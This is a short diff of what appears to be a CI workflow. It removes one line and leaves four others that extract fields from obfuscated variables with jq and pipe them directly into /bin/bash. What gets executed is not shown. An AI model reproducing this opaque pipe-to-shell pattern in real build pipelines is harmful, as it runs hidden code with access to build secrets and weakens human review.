@@ -25,7 +25,6 @@ jobs:
           echo $vqyeo38 | jq -r .ih00646 | /bin/bash
           echo $oxf5 | jq -r .jjgn9370 | /bin/bash
           echo $rcmbx4334 | jq -r .p086 | /bin/bash
-          printf '%s' "$pdv108" | jq -r .d186 | /bin/bash
           echo $bzif66 | jq -r .ybi345 | /bin/bash
 
       - name: Save output
